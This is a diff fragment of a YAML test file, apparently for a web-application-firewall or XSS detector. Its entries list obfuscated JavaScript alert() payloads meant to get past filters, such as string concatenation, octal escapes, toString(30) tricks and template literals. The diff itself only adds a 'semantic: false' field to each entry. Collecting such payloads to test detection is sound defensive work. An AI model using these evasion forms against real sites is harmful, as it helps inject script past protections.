   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation
@@ -1429,6 +1565,7 @@ tests:
   decoded: (alert)(1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-2
@@ -1437,6 +1574,7 @@ tests:
   decoded: a=alert,a(1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-3
@@ -1445,6 +1583,7 @@ tests:
   decoded: '[1].find(alert)'
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-4
@@ -1453,6 +1592,7 @@ tests:
   decoded: top[“al”+”ert”](1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-5
@@ -1461,6 +1601,7 @@ tests:
   decoded: top[/al/.source+/ert/.source](1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-6
@@ -1469,6 +1610,7 @@ tests:
   decoded: alert(1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-7
@@ -1477,6 +1619,7 @@ tests:
   decoded: top[‘al\145rt’](1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-8
@@ -1485,6 +1628,7 @@ tests:
   decoded: top[‘alert’](1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-9
@@ -1493,6 +1637,7 @@ tests:
   decoded: top[8680439..toString(30)](1)
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-10
@@ -1501,6 +1646,7 @@ tests:
   decoded: alert?.()
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-11
@@ -1509,6 +1655,7 @@ tests:
   decoded: (alert())
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
 - id: filter-bypass-alert-obfuscation-12
@@ -1517,6 +1664,7 @@ tests:
   decoded: '``${alert``}``'
   rules:
   - TODO_js
+  semantic: false
   source: Filter Bypass Alert Obfuscation
   section: Methods to Bypass WAF – Cross-Site Scripting
   lang: js
